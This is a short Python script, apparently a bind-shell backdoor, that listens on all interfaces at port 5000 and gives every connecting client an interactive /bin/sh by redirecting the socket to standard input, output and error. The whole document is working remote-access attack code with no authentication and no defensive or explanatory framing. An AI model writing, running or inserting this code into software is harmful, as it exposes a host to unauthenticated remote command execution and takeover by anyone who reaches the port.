#!/usr/bin/env python3
import subprocess
import socket
import os

def handle_connection(conn, addr):
    print(f"Connection from {addr}, dropping to shell...")
    os.dup2(conn.fileno(), 0)
    os.dup2(conn.fileno(), 1)
    os.dup2(conn.fileno(), 2)
    subprocess.call(["/bin/sh", "-i"])

def main():
    host = '0.0.0.0'
    port = 5000
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((host, port))
        server.listen(5)
        print(f"Listening on {host}:{port}...")
        while True:
            conn, addr = server.accept()
            with conn:
                handle_connection(conn, addr)

if __name__ == "__main__":
    main()
